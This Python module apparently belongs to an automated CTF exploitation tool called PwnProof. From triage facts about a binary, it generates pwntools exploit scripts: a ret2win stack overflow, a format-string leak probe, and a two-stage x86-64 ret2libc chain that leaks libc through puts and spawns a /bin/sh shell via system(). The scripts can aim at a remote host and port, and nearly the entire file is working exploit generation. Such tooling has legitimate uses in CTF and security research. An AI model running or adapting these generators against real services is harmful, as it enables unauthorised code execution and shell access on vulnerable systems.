from __future__ import annotations

import re
from pathlib import Path

from .triage import BinaryFacts


WIN_NAMES = ("win", "get_shell", "give_shell", "backdoor", "shell", "print_flag", "cat_flag")


def _buffer_sizes(facts: BinaryFacts, workspace: Path) -> list[int]:
    sizes: list[int] = []
    for signal in facts.source_signals:
        match = re.search(r"(?:possible )?stack buffer size (\d+)", signal)
        if match:
            sizes.append(int(match.group(1)))
    return sizes


def _unique_buffer_size(facts: BinaryFacts, workspace: Path) -> int | None:
    sizes = set(_buffer_sizes(facts, workspace))
    return sizes.pop() if len(sizes) == 1 else None


def _has_playbook(facts: BinaryFacts, playbook: str, minimum: float = 0.0) -> bool:
    return any(
        hypothesis.playbook == playbook and hypothesis.confidence >= minimum
        for hypothesis in facts.hypotheses
    )


def _has_no_canary(facts: BinaryFacts) -> bool:
    canary = facts.protections.get("canary", "").lower()
    return "no canary" in canary or "disabled" in canary


def _is_non_pie(facts: BinaryFacts) -> bool:
    pie = facts.protections.get("pie", "").lower()
    return "no pie" in pie or "disabled" in pie


def _has_nx(facts: BinaryFacts) -> bool:
    nx = facts.protections.get("nx", "").lower()
    return "enabled" in nx and "disabled" not in nx


def generate_ret2win(facts: BinaryFacts, workspace: Path) -> str | None:
    if facts.bits not in {32, 64}:
        return None
    win_name = next((name for name in WIN_NAMES if name in facts.symbols), None)
    if not win_name:
        return None
    buffer_size = _unique_buffer_size(facts, workspace)
    if buffer_size is None:
        return None
    offset = buffer_size + (8 if facts.bits == 64 else 4)
    candidate = facts.symbols[win_name]
    script = f'''#!/usr/bin/env python3
"""Generated by PwnProof's ret2win fast path."""
import os
import re
from pathlib import Path

from pwn import ELF, ROP, context, p64, process

context.log_level = "error"
target = Path(os.environ["TARGET"])
context.binary = ELF(str(target), checksec=False)
p = process([str(target)], cwd=str(target.parent))

rop = ROP(context.binary)
ret = rop.find_gadget(["ret"])
ret_addr = ret.address if ret else 0
offset = {offset}
win = context.binary.symbols["{win_name}"]

payload = b"A" * offset
if ret_addr:
    payload += p64(ret_addr)
payload += p64(win)
p.sendline(payload)
output = p.recvall(timeout=5).decode("utf-8", errors="replace")
print(output)
if not re.search(r"[A-Za-z0-9_]+\\{{[^}}]+\\}}", output):
    raise SystemExit(1)
'''
    return script


def generate_format_probe(facts: BinaryFacts, workspace: Path) -> str | None:
    """Generate a bounded positional-independent stack leak probe."""

    if facts.bits not in {32, 64}:
        return None
    if not _has_playbook(facts, "format_string", 0.8):
        return None
    if not any("user-controlled format" in signal.lower() for signal in facts.source_signals):
        return None

    script = '''#!/usr/bin/env python3
"""Generated by PwnProof's deterministic format-string probe."""
import os
import re
from pathlib import Path

from pwn import ELF, context, process, remote

context.log_level = "error"
target = Path(os.environ["TARGET"])
context.binary = ELF(str(target), checksec=False)
host = os.environ.get("HOST", "")
port = os.environ.get("PORT", "")
if host and port:
    p = remote(host, int(port))
else:
    p = process([str(target)], cwd=str(target.parent))

# Sequential specifiers also work when fortified printf rejects %N$ forms.
probe = b"%p." * 48
p.sendline(probe)
output = p.recvall(timeout=4).decode("utf-8", errors="replace")
print(output)

leaks = re.findall(r"0x[0-9a-fA-F]{6,16}", output)
print("FORMAT_LEAK_COUNT:", len(leaks))
if re.search(r"[A-Za-z0-9_]+\\{[^}\\r\\n]+\\}", output):
    raise SystemExit(0)
raise SystemExit(1)
'''
    return script


def _ret2libc_supported(facts: BinaryFacts, workspace: Path) -> bool:
    if facts.bits != 64 or "x86-64" not in facts.arch.lower():
        return False
    if not _has_playbook(facts, "ret2libc", 0.7):
        return False
    if not _has_playbook(facts, "stack_overflow", 0.7):
        return False
    if not (_has_no_canary(facts) and _has_nx(facts) and _is_non_pie(facts)):
        return False
    if "main" not in facts.symbols or "puts" not in facts.suspicious_functions:
        return False
    return _unique_buffer_size(facts, workspace) is not None


def generate_ret2libc(facts: BinaryFacts, workspace: Path) -> str | None:
    """Generate a two-stage puts-GOT leak and system('/bin/sh') chain."""

    if not _ret2libc_supported(facts, workspace):
        return None
    buffer_size = _unique_buffer_size(facts, workspace)
    if buffer_size is None:
        return None
    offset = buffer_size + 8
    identified_libc = next(
        (
            item
            for item in facts.libc_candidates
            if "puts" in item.symbols and "system" in item.symbols
        ),
        None,
    )
    known_libc = identified_libc.path if identified_libc else None
    script = r'''#!/usr/bin/env python3
"""Generated by PwnProof's two-stage x86-64 ret2libc fast path."""
import os
import re
import time
from pathlib import Path

from pwn import ELF, ROP, context, p64, process, remote

context.log_level = "error"
target = Path(os.environ["TARGET"])
target_dir = target.parent
elf = ELF(str(target), checksec=False)
context.binary = elf

host = os.environ.get("HOST", "")
port = os.environ.get("PORT", "")
if host and port:
    p = remote(host, int(port))
else:
    loaders = (
        target_dir / "ld-linux-x86-64.so.2",
        target_dir / "ld-linux.so.2",
    )
    loader = next((item for item in loaders if item.is_file()), None)
    if loader:
        p = process(
            [str(loader), "--library-path", str(target_dir), str(target)],
            cwd=str(target_dir),
        )
    else:
        p = process([str(target)], cwd=str(target_dir))

known_libc = __KNOWN_LIBC__
libc_candidates = []
if os.environ.get("PWNPROOF_LIBC"):
    configured = Path(os.environ["PWNPROOF_LIBC"])
    if not configured.is_absolute():
        configured = target_dir / configured
    libc_candidates.append(configured)
if known_libc:
    identified = Path(known_libc)
    if not identified.is_absolute():
        identified = target_dir / identified
    libc_candidates.append(identified)
libc_candidates.extend([
    target_dir / "libc.so.6",
    Path("/lib/x86_64-linux-gnu/libc.so.6"),
    Path("/usr/lib/x86_64-linux-gnu/libc.so.6"),
    Path("/lib64/libc.so.6"),
])
libc_path = next((item for item in libc_candidates if item and item.is_file()), None)
if not libc_path:
    print("NO LIBC CANDIDATE")
    raise SystemExit(1)
libc = ELF(str(libc_path), checksec=False)

rop = ROP(elf)
pop_rdi = rop.find_gadget(["pop rdi", "ret"])
ret = rop.find_gadget(["ret"])
if pop_rdi is None:
    print("NO POP RDI; RET GADGET")
    raise SystemExit(1)

offset = __OFFSET__
main = elf.symbols["main"]
stage1 = b"A" * offset
stage1 += p64(pop_rdi.address) + p64(elf.got["puts"])
stage1 += p64(elf.plt["puts"]) + p64(main)
p.sendline(stage1)
leaked_output = p.recvrepeat(1.0)

puts_low12 = libc.symbols["puts"] & 0xFFF
puts_offset = int(libc.symbols["puts"])
puts_addr = None
for index in range(len(leaked_output) - 5):
    raw = leaked_output[index : index + 6]
    value = int.from_bytes(raw + b"\x00\x00", "little")
    candidate_base = value - puts_offset
    if (
        (value & 0xFFF) == puts_low12
        and candidate_base > 0
        and candidate_base < 0x800000000000
        and candidate_base & 0xFFF == 0
    ):
        puts_addr = value
if puts_addr is None:
    print("RAW LEAK:", leaked_output.hex())
    print("NO LIBC POINTER FOUND")
    raise SystemExit(1)

libc.address = puts_addr - libc.symbols["puts"]
binsh = next(libc.search(b"/bin/sh\x00"))
stage2 = b"B" * offset
if ret is not None:
    stage2 += p64(ret.address)
stage2 += p64(pop_rdi.address) + p64(binsh) + p64(libc.symbols["system"])

time.sleep(0.2)
p.sendline(stage2)
stage2_output = p.recvrepeat(0.5)
if hasattr(p, "poll") and p.poll() is not None:
    print(stage2_output.decode("utf-8", errors="replace"))
    print("STAGE2_EXIT:", p.poll())
    raise SystemExit(1)
try:
    p.sendline(b'cat flag* /flag* 2>/dev/null; echo "$PWNPROOF_FLAG"')
except EOFError:
    print(stage2_output.decode("utf-8", errors="replace"))
    print("SHELL EXITED BEFORE COMMAND")
    raise SystemExit(1)
output = p.recvall(timeout=4).decode("utf-8", errors="replace")
output = stage2_output.decode("utf-8", errors="replace") + output
print(output)
if not re.search(r"[A-Za-z0-9_]+\{[^}\r\n]+\}", output):
    raise SystemExit(1)
'''
    return script.replace("__OFFSET__", str(offset)).replace(
        "__KNOWN_LIBC__",
        repr(known_libc),
    )


def _write_candidate(exploit_dir: Path, filename: str, body: str) -> Path:
    exploit_dir.mkdir(parents=True, exist_ok=True)
    path = exploit_dir / filename
    path.write_text(body, encoding="utf-8", newline="\n")
    return path


def generate_candidate(
    facts: BinaryFacts,
    workspace: Path,
    exploit_dir: Path,
) -> Path | None:
    body = generate_ret2win(facts, workspace)
    if body:
        return _write_candidate(exploit_dir, "heuristic_ret2win.py", body)

    for hypothesis in facts.hypotheses:
        if hypothesis.playbook == "format_string":
            body = generate_format_probe(facts, workspace)
            if body:
                return _write_candidate(exploit_dir, "heuristic_format_probe.py", body)
        if hypothesis.playbook == "ret2libc":
            body = generate_ret2libc(facts, workspace)
            if body:
                return _write_candidate(exploit_dir, "heuristic_ret2libc.py", body)
    return None

